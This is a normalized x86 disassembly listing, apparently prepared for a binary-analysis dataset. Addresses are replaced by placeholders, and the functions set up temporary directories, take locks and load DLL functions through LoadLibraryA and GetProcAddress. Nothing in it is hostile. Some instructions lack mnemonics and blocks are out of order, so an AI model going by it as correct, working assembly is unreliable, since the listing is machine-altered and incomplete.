mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
imul edi edi 0x38
push edi
call sub_4b573e
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
push esi
push eax
push ecx
mov [ ebp + 0x10 ] eax
mov [ ebp + 0xc ] eax
mov eax esp
mov [ eax ] edx
push ecx
mov eax esp
mov [ ebp - 0x4 ] 0x1
mov [ eax ] ecx
call sub_402f50
mov ecx [ ebp + 0x8 ]
add esp 0x14
push ecx
push esi
lea edx [ ebp - 0x50 ]
push edx
push ebx
push eax
mov [ ebp + 0xc ] eax
call sub_4036e0
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov eax ebx
imul eax eax 0x38
add esp 0x14
add ecx eax
mov eax [ esi + 0x8 ]
push edx
push esi
push ecx
push ecx
mov [ ebp + 0xc ] ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_402f50
mov eax [ esi + 0x4 ]
add esp 0x14
test eax eax
jne r-xdata
mov ecx esi
call sub_401120
mov edi eax
add edi ebx
add edx ebx
cmp edi edx
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax [ ebp + 0x10 ]
imul ebx ebx 0x38
add edi eax
add ebx eax
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
push ecx
push eax
mov ecx esi
call sub_4a6420
mov edx [ esi + 0x4 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esi + 0x4 ]
add ebx edx
test eax eax
je r-xdata
sub_4042e0
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x18 ]
mov [ eax ] edx
mov eax esp
mov [ eax ] ecx
call sub_4037c0
add esp 0x14
retn 0xc
sub_404310
sub esp 0x8
push ebx
push esi
push edi
mov edi ecx
push edi
call [ EnterCriticalSection@IAT ]
inc [ edi + 0x28 ]
call [ GetCurrentThreadId@IAT ]
mov ebx [ edi + 0x1c ]
lea esi [ edi + 0x18 ]
mov [ esp + 0xc ] eax
xor edx edx
mov ecx [ esi + 0x8 ]
sub ecx ebx
sar ecx 0x3
xor ecx ecx
jmp r-xdata
mov edx [ esi + 0x4 ]
test edx edx
mov [ esp + 0x10 ] 0x1
jne r-xdata
mov ecx [ edi + 0x1c ]
cmp [ ecx + edx * 8 ] eax
je r-xdata
cmp edx ecx
jge r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x3
xor ecx ecx
jmp r-xdata
mov eax [ edi + 0x1c ]
mov ecx [ eax + edx * 8 + 0x4 ]
lea eax [ eax + edx * 8 + 0x4 ]
inc ecx
mov [ eax ] ecx
mov ecx [ edi + 0x1c ]
mov eax [ ecx + edx * 8 + 0x4 ]
pop edi
pop esi
pop ebx
add esp 0x8
retn
inc edx
jmp r-xdata
mov eax [ esi + 0x8 ]
lea ecx [ esp + 0xc ]
push ecx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx esi
call sub_403220
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x8
retn
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x3
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
test ebx ebx
jne r-xdata
mov edx [ esp + 0xc ]
mov edi [ esi + 0x8 ]
push edx
push esi
lea eax [ esp + 0x14 ]
push eax
push 0x1
push edi
call sub_4607a0
add esp 0x14
add edi 0x8
mov [ esi + 0x8 ] edi
mov eax 0x1
pop edi
pop esi
pop ebx
add esp 0x8
retn
sub_404410
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
xor edi edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
lea ecx [ ecx ]
mov ecx [ esi ]
call sub_404310
mov eax [ esi + 0x4 ]
inc edi
cmp edi eax
jl r-xdata
sub_404440
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4be948
push eax
mov [ fs : 0x0 ] esp
push ebx
push ebp
push esi
push edi
mov ecx rw-data
call sub_404310
mov ebp [ rw-data ]
cmp ebp [ rw-data ]
je r-xdata
mov ecx rw-data
call sub_401420
xor eax eax
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov edi [ esp + 0x20 ]
mov eax edi
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov edx [ ebp + 0x14 ]
test edx edx
je r-xdata
cmp edx eax
jb r-xdata
cmp edx eax
mov ecx edx
jb r-xdata
mov eax [ rw-data ]
add ebp 0x38
cmp ebp eax
jne r-xdata
xor ebx ebx
cmp edx eax
setne bl
test ebx ebx
je r-xdata
cmp [ ebp + 0x18 ] 0x10
jb r-xdata
mov ecx eax
mov ecx rw-data
call sub_401420
xor eax eax
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
cmp ebp [ rw-data ]
jne r-xdata
lea esi [ ebp + 0x4 ]
mov esi [ ebp + 0x4 ]
jmp r-xdata
cmp [ ebp + 0x34 ] 0x10
jb r-xdata
test ebx ebx
jne r-xdata
sbb ebx ebx
sbb ebx 0xffffffff
xor ebx ebx
[ esi ] [ edi ]
je r-xdata
add ebp 0x20
mov ebp [ ebp + 0x20 ]
jmp r-xdata
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov eax ebp
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0xc
retn
sub_404550
push 0xffffffff
push sub_4be948
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
push esi
push edi
mov ecx rw-data
call sub_404310
mov eax [ rw-data ]
cmp eax [ rw-data ]
mov esi eax
mov [ esp + 0x10 ] esi
je r-xdata
mov ecx rw-data
call sub_401420
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
lea ebp [ eax + 0x30 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov edx [ ebp ]
test edx edx
je r-xdata
cmp edx eax
jb r-xdata
cmp edx eax
mov ecx edx
jb r-xdata
mov eax [ rw-data ]
add esi 0x38
add ebp 0x38
cmp esi eax
mov [ esp + 0x10 ] esi
jne r-xdata
xor ebx ebx
cmp edx eax
setne bl
test ebx ebx
je r-xdata
cmp [ ebp + 0x4 ] 0x10
jb r-xdata
mov ecx eax
mov edi [ esp + 0x24 ]
mov eax edi
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov ecx rw-data
call sub_401420
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
cmp esi [ rw-data ]
jne r-xdata
lea esi [ ebp - 0x10 ]
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
test ebx ebx
mov esi [ esp + 0x10 ]
jne r-xdata
sbb ebx ebx
sbb ebx 0xffffffff
xor ebx ebx
[ esi ] [ edi ]
je r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0x14 ]
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_404670
push 0xffffffff
push sub_4be96b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x310
mov ecx rw-data
mov [ esp ] rw-data
call sub_404310
lea eax [ esp + 0x4 ]
push eax
push 0x104
mov [ esp + 0x320 ] 0x0
call [ GetTempPathA@IAT ]
push 0x208
lea ecx [ esp + 0x10c ]
push ecx
lea edx [ esp + 0xc ]
push edx
call sub_457da0
lea eax [ esp + 0x114 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x10c ]
push eax
mov ecx rw-data
call sub_401e80
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx rw-data
call sub_401cc0
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
test eax eax
jne r-xdata
mov eax rw-data
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0x310 ]
mov eax 0x1
mov [ fs : 0x0 ] ecx
add esp 0x31c
retn
call [ GetLastError@IAT ]
cmp eax 0xb7
je r-xdata
mov ecx rw-data
call sub_401420
xor eax eax
mov ecx [ esp + 0x310 ]
mov [ fs : 0x0 ] ecx
add esp 0x31c
retn
sub_404790
push 0xffffffff
push sub_4be996
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x228
push edi
mov ecx rw-data
mov [ esp + 0x28 ] rw-data
call sub_404310
mov eax [ rw-data ]
xor edi edi
cmp eax edi
mov [ esp + 0x234 ] edi
jne r-xdata
push 0xffffffff
push edi
push rw-data
lea ecx [ esp + 0x14 ]
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] edi
mov [ esp + 0x18 ] 0x0
call sub_401dd0
cmp [ esp + 0x20 ] 0x10
mov eax [ esp + 0xc ]
mov [ esp + 0x234 ] 0x1
jae r-xdata
call sub_404670
test eax eax
jne r-xdata
push eax
call sub_457f00
add esp 0x4
test eax eax
jle r-xdata
lea eax [ esp + 0xc ]
mov ecx rw-data
call sub_401420
or eax 0xffffffff
pop edi
mov ecx [ esp + 0x228 ]
mov [ fs : 0x0 ] ecx
add esp 0x234
retn
push ebx
push ebp
push esi
mov esi [ esp + 0x248 ]
cmp [ esi ] 0x0
je r-xdata
push 0x5c
push 0x1
lea ecx [ esp + 0x10 ]
call sub_4017f0
mov esi [ esp + 0x24c ]
push 0xffffffff
push edi
lea eax [ esp + 0x1c ]
push eax
mov ecx esi
call sub_401dd0
mov [ esp + 0x30 ] edi
jmp r-xdata
mov edi edi
mov eax [ rw-data ]
mov [ esp + 0x10 ] 0x0
lea ebx [ eax + 0x20 ]
cmp al 0x5c
je r-xdata
push eax
push 0x1
lea ecx [ esp + 0x1c ]
call sub_4017f0
inc esi
xor edx edx
mov dl [ esi ]
push edx
jmp r-xdata
cmp [ esp + 0x2c ] 0x10
pop esi
pop ebp
pop ebx
jb r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
mov eax [ esp + 0x10 ]
add edx ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add edx ecx
cmp eax edx
jae r-xdata
push 0x5f
cmp al 0x2f
je r-xdata
lea ecx [ esp + 0x18 ]
push 0x1
call sub_4017f0
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
mov ecx rw-data
mov [ esp + 0x20 ] 0xf
mov [ esp + 0x1c ] 0x0
mov [ esp + 0xc ] 0x0
call sub_401420
mov ecx [ esp + 0x22c ]
xor eax eax
pop edi
mov [ fs : 0x0 ] ecx
add esp 0x234
retn
mov eax [ esp + 0xc ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ ebx + 0x14 ] 0x10
mov ebp [ ebx + 0x10 ]
jb r-xdata
xor eax eax
mov al [ esi ]
mov cl al
xor cl 0x20
add cl 0x5f
cmp cl 0x3b
ja r-xdata
cmp al 0x3a
je r-xdata
mov edi ebx
mov edi [ ebx ]
jmp r-xdata
push eax
jmp r-xdata
cmp edx ebp
jb r-xdata
cmp edx ebp
mov ecx edx
jb r-xdata
mov edx [ esi + 0x14 ]
test edx edx
je r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ rw-data ]
inc ecx
mov [ esp + 0x10 ] ecx
add ebx 0x38
jmp r-xdata
xor eax eax
cmp edx ebp
setne al
test eax eax
je r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov ecx ebp
test eax eax
je r-xdata
mov eax [ esp + 0x30 ]
inc eax
push eax
lea edx [ esp + 0x3c ]
push r--data
push edx
mov [ esp + 0x3c ] eax
call [ wsprintfA@IAT ]
mov eax [ esp + 0x38 ]
mov edi 0x10
add esp 0xc
cmp eax edi
mov eax [ esp + 0x18 ]
jae r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
push eax
call sub_458010
mov esi eax
mov eax [ esp + 0x30 ]
add esp 0x4
cmp eax edi
mov eax [ esp + 0x18 ]
jae r-xdata
lea eax [ esp + 0x18 ]
test eax eax
mov esi [ esp + 0x24c ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
xor eax eax
[ esi ] [ edi ]
je r-xdata
push 0x100
add eax esi
push eax
lea eax [ esp + 0x140 ]
push eax
call [ lstrcpynA@IAT ]
cmp [ esp + 0x2c ] edi
mov eax [ esp + 0x18 ]
jae r-xdata
lea eax [ esp + 0x18 ]
push esi
mov esi [ esp + 0x250 ]
push eax
mov ecx esi
call sub_401e80
lea eax [ esp + 0x38 ]
lea edx [ eax + 0x1 ]
mov edi edi
lea eax [ esp + 0x18 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x3c ]
push ecx
mov ecx esi
call sub_401cc0
lea eax [ esp + 0x138 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x13c ]
push edx
mov ecx esi
call sub_401cc0
mov esi [ esp + 0x24c ]
jmp r-xdata
sub_404aa0
push 0xffffffff
push sub_4be9a8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
mov ecx rw-data
mov [ esp + 0x8 ] rw-data
call sub_404310
mov eax [ esp + 0x1c ]
xor edi edi
dec eax
mov [ esp + 0x14 ] edi
je r-xdata
cmp [ rw-data ] edi
jne r-xdata
dec eax
je r-xdata
mov ecx rw-data
call sub_401420
pop edi
mov eax 0x1
pop esi
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push r--data
call [ LoadLibraryA@IAT ]
cmp eax edi
mov [ rw-data ] eax
jne r-xdata
cmp [ rw-data ] edi
jne r-xdata
dec eax
jne r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push edi
push r--data
push r--data
push edi
call [ MessageBoxA@IAT ]
jmp r-xdata
push r--data
call [ LoadLibraryA@IAT ]
cmp eax edi
mov [ rw-data ] eax
jne r-xdata
cmp [ rw-data ] edi
jne r-xdata
push edi
push r--data
push r--data
push edi
call [ MessageBoxA@IAT ]
mov eax [ rw-data ]
push eax
call [ FreeLibrary@IAT ]
mov [ rw-data ] edi
call eax
cmp eax 0x1
jne r-xdata
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0xc ]
pop edi
xor eax eax
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov esi [ GetProcAddress@IAT ]
push r--data
push eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push edi
push r--data
push r--data
push edi
call [ MessageBoxA@IAT ]
jmp r-xdata
push r--data
call [ LoadLibraryA@IAT ]
cmp eax edi
mov [ rw-data ] eax
jne r-xdata
push edi
push r--data
push r--data
push edi
call [ MessageBoxA@IAT ]
mov ecx [ rw-data ]
push ecx
call [ FreeLibrary@IAT ]
mov [ rw-data ] edi
jmp r-xdata
call eax
cmp eax 0x1
je r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push edi
push r--data
push r--data
push edi
call [ MessageBoxA@IAT ]
jmp r-xdata
mov ecx [ rw-data ]
push ecx
call [ FreeLibrary@IAT ]
push edi
push r--data
push r--data
push edi
mov [ rw-data ] edi
call [ MessageBoxA@IAT ]
jmp r-xdata
call eax
cmp eax 0x4
je r-xdata
sub_404f00
push ebp
mov ebp esp
push 0xffffffff
push sub_4be9d0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov ecx rw-data
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] ecx
call sub_404310
xor ebx ebx
xor esi esi
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x14 ] esi
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
cmp [ rw-data ] ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
push 0x1
push ebx
push ebx
push ebx
push ebx
push edi
mov [ ebp - 0x4 ] 0x2
call sub_41c070
add esp 0x18
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp esi ebx
push ecx
mov [ ebp + 0x8 ] esp
mov eax esp
je r-xdata
mov esi eax
mov [ ebp - 0x14 ] esi
inc [ eax + 0x4 ]
cmp [ rw-data ] ebx
je r-xdata
push edi
call [ rw-data ]
mov [ eax ] esi
call [ rw-data ]
inc [ esi + 0x4 ]
mov eax [ rw-data ]
mov edx 0x10
push ecx
cmp eax edx
mov eax [ rw-data ]
mov ecx esp
jae r-xdata
cmp esi ebx
push ecx
mov [ ebp + 0x8 ] esp
mov eax esp
je r-xdata
mov edi [ rw-data ]
add eax edi
mov [ ecx ] eax
push ecx
cmp [ rw-data ] edx
mov ecx [ rw-data ]
mov eax esp
jae r-xdata
mov eax rw-data
mov [ eax ] esi
call [ rw-data ]
inc [ esi + 0x4 ]
mov [ eax ] ecx
lea eax [ ebp + 0x8 ]
push eax
mov ecx rw-data
call sub_401c60
cmp esi ebx
mov [ ebp - 0x4 ] bl
je r-xdata
mov ecx rw-data
mov ecx rw-data
call sub_401420
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
dec [ esi + 0x4 ]
jne r-xdata
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx ]
sub_405030
push esi
mov ecx rw-data
call sub_404310
mov eax [ rw-data ]
test eax eax
mov esi [ FreeLibrary@IAT ]
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call esi
mov [ rw-data ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call esi
mov [ rw-data ] 0x0
mov ecx rw-data
pop esi
jmp sub_401420
push eax
call esi
mov [ rw-data ] 0x0
sub_405090
push ebp
mov ebp esp
push 0xffffffff
push sub_4be9f0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x20 ]
xor ebx ebx
mov esi 0x10
cmp eax esi
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] ebx
jae r-xdata
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebp + 0xc ]
test al 0x10
je r-xdata
cmp [ ebp + 0x20 ] esi
jb r-xdata
xor esi esi
mov edi 0x6
mov [ ebp - 0x14 ] esi
mov eax [ rw-data ]
cmp eax 0x3
mov [ ebp - 0x4 ] 0x1
ja r-xdata
cmp [ ebp + 0x20 ] esi
jb r-xdata
mov eax 0x7
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp esi ebx
mov [ ebp - 0x4 ] bl
je r-xdata
jmp [ eax * 4 + jump_table_40538c ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
cmp [ ebp + 0x20 ] 0x10
jb r-xdata
dec [ esi + 0x4 ]
jne r-xdata
cmp [ ebp + 0x20 ] 0x10
mov eax [ ebp + 0xc ]
jae r-xdata
mov eax [ ebp + 0x20 ]
mov esi 0x10
cmp eax esi
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
jae r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
push ebx
push eax
call sub_4b3a50
add esp 0x8
test eax eax
jne r-xdata
lea eax [ ebp + 0xc ]
push 0x1
push ebx
push ebx
push ebx
push ebx
push eax
call sub_41c070
add esp 0x18
push eax
lea ecx [ ebp - 0x14 ]
call sub_401020
mov ecx [ ebp + 0x1c ]
cmp ecx 0x4
mov [ ebp - 0x4 ] 0x1
jbe r-xdata
lea eax [ ebp + 0xc ]
mov edi 0x4
cmp [ rw-data ] 0x2
je r-xdata
mov esi [ ebp - 0x14 ]
cmp [ ebp + 0x20 ] esi
mov eax [ ebp + 0xc ]
jae r-xdata
cmp edi 0x6
jne r-xdata
lea esi [ eax + ecx - 0x4 ]
push r--data
push esi
call sub_4bdf8e
add esp 0x8
test eax eax
je r-xdata
lea eax [ ebp + 0xc ]
cmp [ ebp + 0x20 ] 0x10
mov eax [ ebp + 0xc ]
jae r-xdata
push 0x3
call sub_404aa0
add esp 0x4
test eax eax
je r-xdata
push r--data
push esi
call sub_4bdf8e
add esp 0x8
test eax eax
je r-xdata
push ebx
push eax
call sub_4b3a50
add esp 0x8
test eax eax
je r-xdata
lea eax [ ebp + 0xc ]
mov esi [ ebp - 0x14 ]
cmp esi ebx
push ecx
mov [ ebp - 0x18 ] esp
mov eax esp
je r-xdata
push r--data
push esi
call sub_4bdf8e
add esp 0x8
test eax eax
je r-xdata
mov [ eax ] esi
call [ rw-data ]
cmp eax ebx
jne r-xdata
inc [ esi + 0x4 ]
push r--data
push esi
call sub_4bdf8e
add esp 0x8
test eax eax
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov edi 0x3
jmp r-xdata
push r--data
push esi
call sub_4bdf8e
add esp 0x8
test eax eax
je r-xdata
push r--data
push esi
call sub_4bdf8e
add esp 0x8
test eax eax
je r-xdata
push r--data
push esi
call sub_4bdf8e
add esp 0x8
test eax eax
jne r-xdata
push r--data
push esi
call sub_4bdf8e
add esp 0x8
test eax eax
jne r-xdata
push 0x2
call sub_404aa0
add esp 0x4
test eax eax
je r-xdata
push 0x1
call sub_404aa0
add esp 0x4
test eax eax
je r-xdata
mov esi [ ebp - 0x14 ]
cmp esi ebx
push ecx
mov [ ebp - 0x18 ] esp
mov eax esp
je r-xdata
mov edi 0x1
mov [ eax ] esi
call [ rw-data ]
cmp eax ebx
jne r-xdata
inc [ esi + 0x4 ]
mov edi 0x2
jmp r-xdata
sub_405354
mov ecx [ ebp - 0x14 ]
xor ebx ebx
cmp ecx ebx
mov [ ebp - 0x4 ] bl
je r-xdata
lea ecx [ ebp + 0x8 ]
call sub_4480e0
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov eax 0x7
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
dec [ ecx + 0x4 ]
jne r-xdata
mov edx [ ecx ]
push 0x1
call [ edx ]
sub_4053a0
push ebp
mov ebp esp
push 0xffffffff
push sub_4bea3b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x1094
call sub_4b6180
mov eax [ ebp + 0xc ]
test eax eax
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x18 ] 0x10
lea esi [ ebx + 0x4 ]
jb r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx 0xf
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x40 ] al
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x60 ] al
cmp [ ebx + 0x18 ] 0x10
mov [ ebp - 0x4 ] 0x1
jb r-xdata
push eax
call sub_457f40
mov edi eax
add esp 0x4
xor eax eax
test edi edi
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
lea ecx [ edi - 0x1 ]
push ecx
push eax
lea ecx [ ebp - 0x44 ]
call sub_401e80
cmp [ ebx + 0x18 ] 0x10
mov eax [ ebx + 0x14 ]
jb r-xdata
mov eax [ ebp - 0x4c ]
mov esi 0x10
cmp eax esi
jb r-xdata
jmp [ eax * 4 + jump_table_405ccc ]
sub eax edi
add ecx edi
push eax
push ecx
lea ecx [ ebp - 0x64 ]
call sub_401e80
mov eax [ ebx + 0x40 ]
cmp eax 0x4
ja r-xdata
cmp [ ebp - 0x2c ] esi
mov [ ebp - 0x4c ] 0xf
mov [ ebp - 0x50 ] 0x0
mov [ ebp - 0x60 ] 0x0
jb r-xdata
mov eax [ ebp - 0x60 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov edi [ ebp + 0xc ]
test edi edi
mov eax [ ebx + 0x18 ]
je r-xdata
xor edi edi
mov [ ebp - 0x20 ] edi
mov eax [ ebp - 0x2c ]
mov esi 0x10
cmp eax esi
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x3
jae r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
mov eax [ ebp - 0x2c ]
jne r-xdata
mov esi [ ebp + 0x10 ]
mov eax [ ebp - 0x2c ]
xor edi edi
cmp esi edi
je r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0x40 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
cmp eax 0x10
jb r-xdata
cmp eax 0x10
jb r-xdata
push 0x1
push edi
push edi
push edi
push edi
push eax
call sub_41c070
add esp 0x18
push eax
lea ecx [ ebp - 0x20 ]
call sub_401020
mov eax [ ebp + 0x18 ]
